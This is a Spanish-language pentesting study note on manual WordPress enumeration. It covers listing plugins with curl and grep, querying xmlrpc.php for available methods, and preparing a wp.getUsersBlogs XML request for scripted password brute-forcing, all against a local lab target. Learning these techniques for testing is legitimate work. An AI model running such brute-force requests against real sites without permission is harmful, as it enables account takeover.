
___

# Enumeración manual - plugins

Para detectar plugins de forma manual podemos hacer lo siguiente:

Acudir a la ruta `/wp-content/plugins/` --> si haciendo *'directory list'* encontramos esta ruta como accesible es  de por si una vulnerabilidad. En caso de no tener acceso haríamos `curl -s -X GET` para tratar de listar plugins en el código fuente de la página.

Una solicitud con `curl` que nos permita filtrar la información (usando expresiones regulares o regend) sería la siguiente:

```bash
curl -s -X GET "http://127.0.0.1:31337/" | grep -oP 'plugins/\K[^/]+' | sort -u
```


`K.*` (para mostrar a partir de plugins y quitando lo anterior a la barra, es decir quitando plugins), si modificamos y añadimos `[^/]+'` (queremos ver lo que hay después de plugin y hasta la siguiente barra `/`)

Podemos adaptar la regend para mostrar más o menos información como las versiones de los plugins o solo el nombre.

---

# Enumeración manual - XML-RPC

Probamos la ruta /xmlrpc.php. Si en el navegador nos muestra que existe con algún mensaje como *'Only accept POST'*, quiere decir que hay una posible vulnerabilidad del tipo XMLRPC. Por lo que podemos probar una solicitud `curl -s -X POST`. Del mismo modo lo inteligente es buscar por internet algo como: *abusing xmlrcp.php WordPress*. Pongamos que damos con una página como esta: https://nitesculucian.github.io/2019/07/02/exploiting-the-xmlrpc-php-on-all-wordpress-versions/

Investigaríamos la página encontrada por internet viendo formas de abusar/explotar el archivo `xmlrpc.php`. Para ello nos muestra que tenemos que hacer una solicitud POST pero por `.xml` . Entonces podemos crear un archivo 'file.xml' que contenga la información que encontramos en la página. Sería algo así:

```bash 
mkdir content 
cd content 
nvim file.xml
```
file.xml :
 ```xml
<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```

Una vez creado este archivo lo enviamos con `curl` por el método post del siguiente modo:

```bash
curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file.xml | bat -l xml 
```

De este modo mandamos una solicitud POST que envía (`-d@`) el archivo '`file.xml`' , con `| cat -l xml` para ver más visual

Esto de ser efectivo nos puede mostrar todos los métodos disponibles de esta URL. Dado el caso podríamos ver que existe un método '`'wp.getUsersBlogs'` (otros métodos que permiten fuerza bruta: `wp.getUsers`, `wp.getAuthors` o `wp.getComments`) esto nos puede permitir hacer un [Script](Script.md). en Bash o Python de fuerza bruta. Para ello el script debe de contener la siguiente información:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>USUARIO</value></param> 
<param><value>CONTRASEÑA</value></param> 
</params> 
</methodCall>
```

Podemos crear un nuevo archivo `.xml`, borrar o editar el que hicimos llamado file.xml

Podemos modificar el archivo `.xml` con un usuario que ya hayamos detectado como válido, e ir probando contraseñas. Para automatizar esto de la contraseña podemos hacer un [Script](Script.md). (otros métodos son usar [Burp Suite](../../Herramientas/Burp%20Suite/BurpSuite.md). con el intruder, pero esto sería muy lento, mejor un script).

En caso de que las credenciales no sean correctas, el servidor responderá con un mensaje de error que indica que las credenciales son incorrectas. Sin embargo, si las credenciales son válidas, la respuesta del servidor será diferente y no incluirá el mensaje de error.

De esta forma, podremos utilizar la respuesta del servidor para determinar cuándo hemos encontrado credenciales válidas y, de esta forma, tener acceso al sitio web de WordPress comprometido.

---
